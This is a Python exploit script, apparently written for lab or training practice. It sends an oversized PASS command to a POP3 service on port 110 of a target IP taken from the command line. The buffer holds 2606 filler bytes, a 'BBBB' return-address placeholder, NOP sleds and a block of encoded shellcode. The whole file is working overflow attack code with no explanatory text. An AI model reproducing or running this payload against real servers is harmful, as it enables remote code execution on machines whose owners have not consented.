#! /usr/bin/python

import socket
import sys

if len(sys.argv) != 2:
    print("[-] usage: fuzz.py <ip address>")
    exit()


buf =  b""
buf += b"\xb8\xad\xea\xc8\x95\xda\xd8\xd9\x74\x24\xf4\x5b\x2b"
buf += b"\xc9\xb1\x52\x31\x43\x12\x83\xeb\xfc\x03\xee\xe4\x2a"
buf += b"\x60\x0c\x10\x28\x8b\xec\xe1\x4d\x05\x09\xd0\x4d\x71"
buf += b"\x5a\x43\x7e\xf1\x0e\x68\xf5\x57\xba\xfb\x7b\x70\xcd"
buf += b"\x4c\x31\xa6\xe0\x4d\x6a\x9a\x63\xce\x71\xcf\x43\xef"
buf += b"\xb9\x02\x82\x28\xa7\xef\xd6\xe1\xa3\x42\xc6\x86\xfe"
buf += b"\x5e\x6d\xd4\xef\xe6\x92\xad\x0e\xc6\x05\xa5\x48\xc8"
buf += b"\xa4\x6a\xe1\x41\xbe\x6f\xcc\x18\x35\x5b\xba\x9a\x9f"
buf += b"\x95\x43\x30\xde\x19\xb6\x48\x27\x9d\x29\x3f\x51\xdd"
buf += b"\xd4\x38\xa6\x9f\x02\xcc\x3c\x07\xc0\x76\x98\xb9\x05"
buf += b"\xe0\x6b\xb5\xe2\x66\x33\xda\xf5\xab\x48\xe6\x7e\x4a"
buf += b"\x9e\x6e\xc4\x69\x3a\x2a\x9e\x10\x1b\x96\x71\x2c\x7b"
buf += b"\x79\x2d\x88\xf0\x94\x3a\xa1\x5b\xf1\x8f\x88\x63\x01"
buf += b"\x98\x9b\x10\x33\x07\x30\xbe\x7f\xc0\x9e\x39\x7f\xfb"
buf += b"\x67\xd5\x7e\x04\x98\xfc\x44\x50\xc8\x96\x6d\xd9\x83"
buf += b"\x66\x91\x0c\x03\x36\x3d\xff\xe4\xe6\xfd\xaf\x8c\xec"
buf += b"\xf1\x90\xad\x0f\xd8\xb8\x44\xea\x8b\x06\x30\x9a\xd6"
buf += b"\xef\x43\x62\xe8\x54\xca\x84\x80\xba\x9b\x1f\x3d\x22"
buf += b"\x86\xeb\xdc\xab\x1c\x96\xdf\x20\x93\x67\x91\xc0\xde"
buf += b"\x7b\x46\x21\x95\x21\xc1\x3e\x03\x4d\x8d\xad\xc8\x8d"
buf += b"\xd8\xcd\x46\xda\x8d\x20\x9f\x8e\x23\x1a\x09\xac\xb9"
buf += b"\xfa\x72\x74\x66\x3f\x7c\x75\xeb\x7b\x5a\x65\x35\x83"
buf += b"\xe6\xd1\xe9\xd2\xb0\x8f\x4f\x8d\x72\x79\x06\x62\xdd"
buf += b"\xed\xdf\x48\xde\x6b\xe0\x84\xa8\x93\x51\x71\xed\xac"
buf += b"\x5e\x15\xf9\xd5\x82\x85\x06\x0c\x07\xb5\x4c\x0c\x2e"
buf += b"\x5e\x09\xc5\x72\x03\xaa\x30\xb0\x3a\x29\xb0\x49\xb9"
buf += b"\x31\xb1\x4c\x85\xf5\x2a\x3d\x96\x93\x4c\x92\x97\xb1"


_host = str(sys.argv[1].strip())
_port = 110
_buffer = "A"*2606 + "BBBB" + "\x90" * 16 + buf + "\x90" * 16 + "C"*17

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
    print("[+] Connecting")
    s.connect((_host, _port))
    banner = s.recv(1024)
    print(banner)

    s.send("USER test \r\n")
    data = s.recv(1024)
    print(data)

    s.send("PASS "+ _buffer +"\r\n")
    data = s.recv(1024)
    print(data)

except:
    print("[-] Cannot connect to POP3 Server")
    exit()